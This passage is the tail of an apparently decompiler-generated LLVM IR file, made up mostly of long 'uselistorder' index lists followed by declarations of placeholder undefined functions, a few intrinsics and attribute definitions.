1204, 1205, 474, 312, 313, 596, 597, 315, 1781, 1782, 1783, 1784, 1785, 316, 314, 598, 599, 1786, 1787, 1788, 1789, 317, 600, 1790, 601, 1791, 64, 65, 66, 67, 564, 318, 1792, 175, 1793, 320, 319, 602, 603, 1317, 1318, 425, 184, 1658, 1659, 1660, 1661, 1662, 1794, 1795, 1796, 1797, 1798, 1799, 321, 137, 475, 1800, 1801, 1802, 122, 1663, 604, 1664, 1665, 1666, 1803, 1113, 1804, 1805, 1806, 605, 1807, 1808, 1809, 1114, 1810, 1811, 1812, 1813, 516, 517, 1209, 1210, 606, 1582, 607, 1206, 1649, 1216, 1217, 22, 608, 1207, 201, 609, 2197, 2198, 2199, 23, 24, 202, 203, 204, 2214, 2215, 205, 25, 1208, 206, 207, 1650, 610, 322, 1651, 1652, 1653, 1654, 1655, 208, 330, 324, 329, 328, 325, 323, 332, 331, 327, 326, 1564, 1565, 1566, 1567, 611, 1814, 1815, 1816, 333, 334, 1817, 1821, 1822, 1823, 1824, 1825, 335, 1826, 209, 2031, 2032, 2033, 2034, 337, 336, 338, 2035, 339, 1319, 1320, 167, 68, 2216, 123, 426, 2220, 2221, 69, 1537, 147, 1538, 1539, 1540, 427, 210, 1115, 1827, 70, 211, 1828, 1829, 428, 212, 1116, 430, 1830, 71, 168, 1831, 1832, 429, 2222, 2223, 2224, 2225, 2226, 2229, 2230, 2231, 2232, 2233, 2234, 2235, 2236, 2237, 2238, 2227, 2228, 2239, 2240, 2241, 2242, 2243, 2244, 2245, 2246, 48, 2247, 2248, 2249, 2250, 2251, 49, 2252, 2253, 2254, 50, 2255, 2256, 2257, 51, 2258, 2259, 2260, 2261, 2262, 2263, 2264, 2265, 2266, 2267, 2268, 2269, 2270, 2271, 2272, 2273, 2274, 2275, 2276, 2277, 2278, 2279, 2280, 2281, 2284, 2285, 2286, 2287, 2288, 2289, 2290, 2282, 2283, 2291, 2292, 2293, 2294, 2295, 2296, 2297, 2298, 2299, 2300, 52, 2301, 2302, 2303, 2304, 2305, 53, 2306, 2307, 2308, 2309, 2310, 54, 2311, 2312, 2313, 2314, 2315, 2316, 2317, 2318, 2319, 2320, 2321, 2322, 2323, 2324, 2325, 340, 1667, 1117, 1668, 1707, 1669, 1670, 1704, 612, 613, 1705, 1706, 213, 214, 215, 344, 1671, 342, 1672, 1693, 1686, 1118, 1687, 1688, 1689, 1690, 72, 73, 150, 1691, 1692, 431, 1694, 1695, 1119, 1696, 341, 1697, 74, 75, 149, 1698, 1699, 1120, 1700, 1701, 76, 77, 148, 1702, 343, 1703, 216, 1673, 1121, 1674, 1675, 614, 1676, 1677, 1122, 1678, 1679, 1682, 1680, 1681, 432, 1683, 78, 79, 152, 1684, 1123, 80, 81, 151, 1685, 1708, 1124, 1709, 1710, 1711, 1712, 1713, 1541, 1125, 1542, 1543, 1544, 1545, 1833, 1834, 1835, 1836, 1837, 346, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 218, 217, 347, 348, 1850, 1851, 1852, 1853, 1854, 1855, 219, 220, 1856, 1857, 1858, 1859, 1860, 1861, 55, 1862, 1863, 1864, 1865, 1866, 82, 349, 1867, 221, 616, 1868, 1869, 1870, 1871, 1872, 617, 350, 1873, 1874, 1875, 1876, 523, 1877, 1878, 1879, 522, 1880, 1881, 521, 1882, 1883, 345, 1884, 615, 1885, 352, 1886, 56, 1887, 518, 484, 1888, 1889, 1890, 618, 619, 1891, 1892, 1893, 519, 520, 1894, 1895, 1896, 351, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 26, 1904, 1905, 1906, 1126, 1907, 1908, 1909, 1910, 1911, 1912, 1914, 1913, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1931, 1932, 222, 1715, 1716, 1127, 1717, 1718, 1719, 1128, 1720, 1721, 83, 84, 153, 1722, 1723, 1724, 124, 125, 1725, 1726, 1727, 353, 1732, 1733, 1734, 1735, 1736, 620, 1737, 1738, 1739, 1740, 1741, 1930, 1927, 1928, 1929, 27, 433, 1742, 223, 1612, 1129, 1613, 1614, 85, 86, 155, 1615, 1616, 1617, 1130, 1618, 1619, 1620, 1621, 1131, 1622, 1623, 87, 88, 154, 1624, 1625, 1626, 1627, 1628, 1934, 1933, 434, 1935, 1936, 224, 1937, 354, 356, 1568, 355, 1569, 357, 1530, 225, 1546, 1551, 1552, 1547, 1548, 1549, 1554, 1555, 1556, 358, 1557, 1558, 1559, 1560, 1561, 1550, 1553, 1562, 226, 1211, 1212, 1213, 359, 1214, 1215, 360, 1218, 1222, 1223, 1224, 1225, 361, 1219, 362, 1220, 1221, 227, 1226, 2044, 2200, 2201, 2202, 363, 2203, 1351, 1350, 2062, 1381, 1227, 2048, 2326, 2327, 364, 2328, 2329, 2330, 2063, 2064, 365, 1352, 1376, 1353, 1132, 1354, 1355, 1356, 1357, 89, 157, 1358, 1359, 1360, 622, 1361, 1362, 1363, 1364, 1133, 1365, 623, 1366, 1367, 90, 158, 1368, 1369, 524, 1370, 1134, 1371, 1372, 1373, 624, 1135, 91, 156, 1374, 621, 1375, 1136, 1169, 1170, 92, 93, 159, 1171, 625, 626, 627, 1172, 366, 2331, 476, 477, 628, 2336, 1140, 2337, 629, 2338, 2339, 630, 2340, 2341, 1138, 367, 436, 2342, 1139, 2343, 631, 126, 2344, 2345, 632, 2362, 2363, 2366, 1137, 435, 2367, 525, 229, 228, 2364, 2365, 2332, 2333, 1141, 368, 419, 1173, 28, 29, 2358, 2042, 2107, 2357, 2049, 1377, 176, 1378, 1142, 369, 1379, 1380, 2346, 2347, 2348, 2349, 633, 2350, 230, 1272, 1273, 177, 1228, 1229, 1143, 1230, 634, 1231, 1232, 1233, 1234, 1235, 94, 95, 160, 1236, 96, 97, 161, 1938, 1939, 138, 438, 1401, 1398, 1399, 1144, 1400, 1402, 1145, 1403, 1404, 1405, 1406, 98, 99, 162, 1407, 370, 1408, 1409, 1410, 1412, 1411, 437, 371, 2050, 1146, 2051, 1174, 1176, 1175, 372, 1177, 1178, 1179, 635, 1180, 2052, 373, 231, 374, 2334, 2335, 1629, 1630, 1631, 1632, 1633, 1634, 376, 232, 1635, 1636, 1637, 178, 375, 1638, 1240, 1241, 636, 1237, 233, 1238, 234, 1239, 377, 1382, 1383, 1384, 30, 1390, 235, 236, 237, 179, 1242, 238, 239, 638, 639, 2353, 637, 240, 241, 2070, 2071, 2072, 2073, 2074, 378, 2075, 2076, 2077, 2078, 2079, 2080, 2081, 379, 2065, 640, 2066, 2067, 641, 2068, 2069, 242, 2082, 2083, 383, 381, 382, 2084, 2085, 389, 388, 266, 380, 2086, 2087, 2088, 2089, 2090, 2091, 486, 485, 526, 642, 2092, 2093, 2094, 127, 2095, 385, 384, 386, 387, 265, 2096, 2097, 439, 2098, 2099, 188, 2100, 2101, 2102, 2103, 2104, 31, 32, 1252, 1253, 128, 33, 527, 643, 1769, 1347, 1336, 1335, 2106, 2105, 2021, 2020, 1414, 1265, 1767, 1766, 243, 2036, 2017, 390, 2016, 391, 1728, 392, 100, 393, 1940, 1941, 395, 1942, 1943, 394, 1944, 189, 2026, 2027, 2028, 396, 1945, 1946, 440, 1947, 1818, 1819, 1820, 244, 2217, 2218, 2219, 441, 34, 2368, 2369, 163, 644, 397, 1948, 1949, 1950, 1951, 1952, 1953, 1954, 1955, 1956, 1957, 245, 1958, 1959, 1960, 1961, 1963, 1964, 1962, 1965, 246, 1966, 1969, 1967, 1968, 398, 645, 1970, 1971, 1972, 399, 400, 1973, 1974, 1975, 1976, 1977, 1978, 646, 1979, 1980, 647, 1981, 1983, 401, 1982, 442, 420, 1984, 1985, 1987, 247, 1988, 403, 1989, 132, 133, 130, 131, 1990, 648, 185, 180, 1991, 1992, 1993, 406, 404, 405, 649, 1994, 1995, 1996, 129, 402, 1997, 1998, 1999, 2000, 2001, 2002, 2003, 2004, 2005, 650, 186, 469, 139, 2006, 2007, 2008, 35, 407, 1181, 1182, 190, 134, 169, 1986, 443, 2009, 1147, 2010, 2011, 2012, 2013, 2014, 2015, 1244, 1243, 446, 1246, 1247, 1245, 444, 445, 1248, 1249, 651, 1250, 267, 1349, 652, 408, 2045, 653, 2354, 2355, 2356, 1254, 2023, 2022, 1255, 2053, 1274, 1729, 1730, 1731, 2054, 2055, 2056, 1256, 1264, 2351, 2352, 2359, 2360, 2361, 1251, 36, 2204, 2205, 2206, 187, 2207, 2208, 2209, 2210, 2211, 409, 2212, 1148, 1151, 1149, 1150, 2213, 1152, 487, 660, 661, 447, 662, 1257, 659, 57, 58, 663, 1258, 1259, 664, 672, 673, 774, 775, 101, 528, 654, 268, 656, 657, 529, 658, 1260, 665, 1261, 666, 667, 1262, 655, 668, 669, 674, 675, 670, 1263, 671, 676, 410, 530, 448, 1267, 677, 1266, 681, 682, 678, 679, 680, 1268, 683, 1269, 565, 1270, 684, 1271, 685, 248, 249, 250, 251, 252, 253, 700, 1275, 531, 686, 532, 1276, 1277, 697, 1278, 1280, 698, 699, 1279, 452, 1281, 696, 701, 1282, 1283, 693, 411, 1284, 1286, 694, 695, 412, 1285, 451, 1287, 702, 1288, 690, 1289, 1291, 691, 692, 1290, 450, 1292, 1293, 687, 1294, 1296, 688, 689, 1295, 449, 1297, 703, 1298, 704, 1299, 1300, 1301, 705, 1302, 1303, 1304, 706, 1305, 1306, 707, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1321, 710, 102, 533, 1322, 1328, 709, 1323, 1324, 1325, 1326, 1327, 453, 1329, 711, 566, 1330, 1331, 708, 1332, 712, 1333, 1334, 254, 714, 103, 534, 191, 567, 1337, 715, 1338, 713, 1339, 1340, 716, 104, 535, 717, 1341, 1342, 718, 1343, 1344, 536, 720, 721, 719, 722, 413, 1345, 1346, 105, 140, 537, 538, 539, 1348, 723, 488, 1050, 1051, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 731, 732, 1165, 1166, 733, 734, 724, 735, 730, 457, 726, 1167, 727, 1168, 728, 729, 1088, 1385, 456, 725, 454, 455, 736, 737, 738, 568, 470, 1386, 1387, 540, 740, 741, 742, 743, 744, 739, 458, 745, 1388, 746, 569, 1389, 164, 459, 414, 106, 107, 415, 1391, 541, 542, 543, 544, 753, 1392, 1394, 1395, 1396, 748, 1397, 749, 750, 751, 747, 460, 752, 1393, 570, 755, 756, 754, 545, 37, 758, 757, 759, 1413, 546, 547, 548, 549, 1415, 1416, 762, 760, 761, 461, 1417, 763, 1418, 1419, 550, 2018, 764, 765, 2019, 108, 771, 109, 770, 766, 769, 463, 772, 767, 768, 462, 773, 110, 141, 2024, 551, 776, 777, 2025, 778, 2030, 779, 2029, 781, 782, 780, 2037, 2038, 571, 2039, 2040, 255, 2041, 111, 572, 2043, 464, 783, 784, 785, 786, 2046, 2047, 489, 787, 2057, 2058, 788, 2059, 789, 2060, 2061, 790, 256, 791, 792, 793, 794, 795, 2118, 257, 112, 471, 465, 554, 555, 2108, 2109, 2110, 466, 552, 553, 556, 2111, 2112, 557, 2113, 2114, 468, 113, 258, 259, 467, 2116, 2117, 573, 260, 114, 796, 2115, 2119, 2120, 558, 2370, 559, 1183, 560, 561, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 2371, 2372, 2373, 2374, 2375, 2376, 2377, 2378, 2379, 2380, 2381, 2382, 2383, 2384, 2385 }
  uselistorder i32* @r4, { 124, 792, 793, 794, 795, 796, 814, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 14, 811, 812, 813, 815, 816, 817, 818, 819, 820, 821, 308, 15, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 125, 126, 127, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 17, 336, 16, 337, 338, 339, 340, 66, 344, 371, 372, 373, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 394, 395, 396, 397, 398, 399, 400, 822, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 5, 438, 439, 440, 441, 442, 443, 444, 445, 446, 18, 447, 448, 520, 469, 470, 471, 551, 552, 553, 472, 473, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 573, 574, 575, 576, 577, 578, 579, 580, 6, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 19, 21, 141, 20, 142, 581, 582, 583, 584, 587, 2, 585, 586, 11, 62, 588, 593, 594, 589, 590, 591, 592, 12, 595, 474, 22, 475, 476, 477, 23, 478, 479, 480, 481, 482, 483, 484, 596, 597, 485, 486, 487, 488, 598, 599, 24, 600, 601, 147, 148, 393, 143, 449, 450, 823, 144, 145, 146, 72, 825, 826, 827, 8, 830, 824, 451, 452, 453, 454, 455, 456, 457, 458, 459, 25, 460, 461, 462, 463, 464, 465, 466, 467, 468, 374, 375, 376, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 731, 732, 221, 222, 223, 224, 225, 226, 831, 832, 345, 346, 26, 7, 347, 521, 522, 523, 524, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 27, 489, 514, 515, 490, 491, 492, 493, 494, 511, 28, 512, 513, 495, 496, 498, 29, 499, 500, 30, 501, 502, 31, 503, 504, 32, 505, 506, 33, 507, 508, 34, 509, 67, 510, 497, 516, 517, 35, 518, 519, 348, 349, 350, 351, 352, 616, 617, 36, 618, 619, 620, 37, 621, 38, 622, 623, 624, 625, 626, 9, 633, 0, 634, 635, 525, 526, 540, 541, 542, 39, 543, 40, 41, 544, 545, 546, 547, 548, 549, 550, 3, 42, 627, 628, 629, 630, 424, 425, 43, 426, 427, 44, 428, 429, 45, 430, 431, 46, 432, 433, 47, 434, 435, 48, 436, 437, 636, 1, 377, 378, 379, 380, 341, 342, 343, 353, 354, 355, 49, 356, 357, 358, 50, 359, 360, 361, 362, 363, 364, 63, 365, 366, 367, 368, 369, 370, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 13, 159, 160, 161, 162, 828, 829, 250, 251, 252, 253, 254, 255, 73, 849, 850, 851, 741, 742, 256, 257, 258, 271, 259, 260, 261, 51, 262, 263, 264, 265, 266, 267, 268, 269, 270, 108, 109, 110, 52, 111, 112, 70, 854, 64, 855, 856, 857, 873, 875, 876, 877, 874, 858, 863, 871, 872, 852, 864, 865, 866, 867, 272, 273, 10, 53, 274, 54, 275, 276, 277, 859, 860, 74, 55, 163, 56, 164, 165, 166, 637, 113, 114, 115, 116, 117, 118, 853, 181, 182, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 278, 279, 280, 281, 282, 294, 295, 283, 284, 285, 286, 287, 288, 177, 178, 179, 180, 183, 184, 296, 297, 298, 299, 300, 301, 75, 861, 862, 185, 186, 187, 188, 743, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 57, 759, 760, 761, 762, 744, 745, 746, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 68, 776, 777, 4, 778, 779, 780, 781, 782, 783, 192, 193, 194, 242, 243, 229, 230, 231, 234, 235, 236, 232, 233, 784, 785, 786, 787, 788, 789, 790, 710, 711, 712, 713, 714, 715, 716, 306, 307, 566, 567, 568, 569, 570, 571, 572, 702, 703, 704, 705, 706, 58, 707, 708, 709, 527, 528, 529, 530, 531, 532, 533, 538, 539, 638, 639, 640, 641, 59, 642, 643, 644, 645, 646, 69, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 60, 694, 695, 696, 697, 698, 119, 120, 121, 681, 682, 71, 65, 683, 699, 61, 700, 701, 631, 632, 189, 190, 191, 244, 245, 246, 737, 738, 739, 740, 717, 718, 719, 722, 723, 724, 720, 721, 534, 535, 536, 537, 868, 869, 870, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 227, 228, 237, 238, 239, 240, 241, 247, 248, 249, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 289, 290, 291, 292, 293, 302, 303, 304, 305, 725, 726, 727, 728, 729, 730, 733, 734, 735, 736, 122, 123, 791 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_9() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_10() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
